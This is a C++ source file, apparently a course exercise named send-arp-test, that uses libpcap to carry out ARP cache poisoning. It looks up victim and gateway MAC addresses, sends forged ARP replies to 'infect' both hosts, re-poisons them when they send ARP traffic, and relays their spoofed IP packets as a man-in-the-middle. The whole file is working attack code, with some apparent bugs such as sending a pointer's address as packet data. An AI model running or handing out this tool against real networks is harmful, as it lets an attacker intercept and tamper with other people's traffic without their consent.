#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <string>
#include <vector>

#include "GetAddrs.h"

#include <thread>

#include "plus.h"

#define UNKNOWN_MAC "00:00:00:00:00:00"
#define BROAD_CAST_MAC "FF:FF:FF:FF:FF:FF"

using namespace std;





struct Ipv4Hdr final{
    uint8_t version4;
    uint8_t tos;
    uint16_t tot_len;
    uint16_t pid;
    uint16_t offset;
    uint8_t ttl;
    uint8_t next_pid;
    uint16_t checksum;
    uint32_t saddr;
    uint32_t daddr;
};


struct EthIpPacket final {
    EthHdr eth_;
    Ipv4Hdr ip_;
};




void getMac(pcap_t* _handle, std::string _senderIp, std::string & _senderMac)
{
    while (true) 
    {
    	struct pcap_pkthdr* header;
    	const u_char* packet;
        int res = pcap_next_ex(_handle, &header, &packet);
            
        if (res == 0) 
            continue;
            
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) 
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(_handle));
            exit(1);
        }

        struct EthArpPacket* etharp = (EthArpPacket*) packet;
        
        if(etharp->eth_.type() == EthHdr::Arp && etharp->arp_.op()==ArpHdr::Reply && etharp->arp_.sip()== Ip(_senderIp.c_str()) )
        {
        	_senderMac = std::string(etharp->arp_.tmac());
           	return;// etharp->arp_.smac();
        }
        else
        {
     	    std::cout << "wrong packet\n" << std::endl
     	    << std::string(_senderMac) << std::endl
     	    << ntohs(etharp->eth_.type_) << std::endl
     	    << ntohs(etharp->arp_.op_) << std::endl
     	    << std::string(etharp->arp_.sip()) << std::endl;
        }
    }
}



void send_packet(pcap_t* _handle, std::string _eth_smac, std::string _eth_dmac, uint16_t _op, std::string _arp_smac, std::string _arp_sip, std::string _arp_tmac, std::string _arp_tip )
{
	EthArpPacket packet;
	
	packet.eth_.type_ = htons(EthHdr::Arp);
	
	packet.eth_.smac_ = Mac(_eth_smac.c_str());
	packet.eth_.dmac_ = Mac(_eth_dmac.c_str());
   	
	// arp informations
    	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    	packet.arp_.pro_ = htons(EthHdr::Ip4);
    	packet.arp_.hln_ = Mac::SIZE;
    	packet.arp_.pln_ = Ip::SIZE;
    	packet.arp_.op_ = _op;
    	
    	// sender informations
    	packet.arp_.smac_ = Mac(_arp_smac.c_str());
    	packet.arp_.sip_ = htonl(Ip(_arp_sip.c_str()));
    	
    	// target informations
    	packet.arp_.tmac_ = Mac(_arp_tmac.c_str());
    	packet.arp_.tip_ = htonl(Ip(_arp_tip.c_str()));

	//
	
    	int res = pcap_sendpacket(_handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    	
    	if (res != 0) 
    	{
        	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(_handle));
    	}

}




void ReInfect(pcap_t* handle, std::string _senderIp, std::string _tatgetIp, std::string _atackerMAC, std::string _attackerIP)
{
    while(1)
    {
        struct pcap_pkthdr* hdr;
        const u_char* packet;

        int res = pcap_next_ex(handle, &hdr, &packet);

        if(res==0)
        	continue;

        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        	exit(1);

        struct EthArpPacket* etharp = (EthArpPacket *)packet;

        if(etharp->eth_.type() == EthHdr::Arp && etharp->arp_.op() == ArpHdr::Reply && etharp->arp_.sip() == _senderIp && etharp->arp_.tip() == _tatgetIp)
        {
            send_packet(handle, _atackerMAC, BROAD_CAST_MAC, htons(ArpHdr::Request), _atackerMAC, _attackerIP, UNKNOWN_MAC, _tatgetIp);
            break;
        }


    }
}


void SendSpoofPacket(pcap_t* _handle, std::string _sourceMac, std::string _destinationMac, std::string senderIp, std::string targetIp, std::string _attackerMac, std::string _attackerIp)
{
    while(1)
    {
        struct pcap_pkthdr* hdr;
        const u_char* packet;

        int res = pcap_next_ex(_handle, &hdr, &packet);

        if(res==0)   continue;

        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
            exit(1);
        
        

        struct EthIpPacket* ethip = (EthIpPacket *)packet;

        if(ethip->eth_.type() == EthHdr::Ip4 && ethip->ip_.saddr == Ip(senderIp.c_str()) && ethip->ip_.daddr != Ip(_attackerIp.c_str()) )
        {
            ethip->eth_.smac_ = _attackerMac;
            ethip->eth_.dmac_ = _destinationMac;
            pcap_sendpacket(_handle, reinterpret_cast<const u_char*>(&packet),sizeof(EthIpPacket));

            break;
        }


    }
}



 void usage()
{
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
	printf("syntax : send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]");
}




int main(int argc, char* argv[]) 
{	



	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	
    	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) 
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	
	std::string myIp;
	std::string myMac;

	std::cout<< "Get My IP, My MAC" << std::endl;	
	GetAddrs(dev, myIp, myMac);
	while(1)
	{	
	
	    	for(int i = 2; i < argc; i+=2)
	    	{
			std::string senderIp = std::string(argv[i]); // victim
			std::string targetIp = std::string(argv[i+1]); // gateway

			// handle, source mac, destination mac, ArpHdr, source mac, source ip, target mac, target ip
			
			
			std::string senderMac;
			send_packet(handle, myMac, BROAD_CAST_MAC, htons(ArpHdr::Request), myMac, myIp, UNKNOWN_MAC, senderIp);
			getMac(handle, senderIp, senderMac);
			//std::cout << senderMac << std::endl;
			// infect sender
			send_packet(handle, myMac, senderMac, htons(ArpHdr::Reply), myMac, targetIp, senderMac, senderIp);
			
			
			
			std::string targetMac;
			send_packet(handle, myMac, BROAD_CAST_MAC, htons(ArpHdr::Request), myMac, myIp, UNKNOWN_MAC, targetIp);
			getMac(handle, targetIp, targetMac);
			//std::cout << targetMac << std::endl;
			// infect target
			send_packet(handle, myMac, senderMac, htons(ArpHdr::Reply), myMac, myIp, targetMac, targetIp);

			
			// at this f'n i have to make insfection packet, perspective in sender so
			// source mac : sender, destination mac : target
	
			// packet for insfection, source mac, dectination mac, ArpHdr, target mac, target ip, sender mac, sender ip
			//send_packet(handle, senderMac, myMac, htons(ArpHdr::Reply), myMac, targetIp, senderMac, senderIp);
			//send_packet(handle, senderMac, myMac, htons(ArpHdr::Relay), myMac, targetIp, senderMac, senderIp);

		    	ReInfect(handle, senderIp, targetIp, myMac, myIp);
			ReInfect(handle, targetIp, senderIp, myMac, myIp);
			
			SendSpoofPacket(handle, myMac, targetMac, senderIp, targetIp, myMac, myIp);

	    	}

	}
	
	return 0;
}



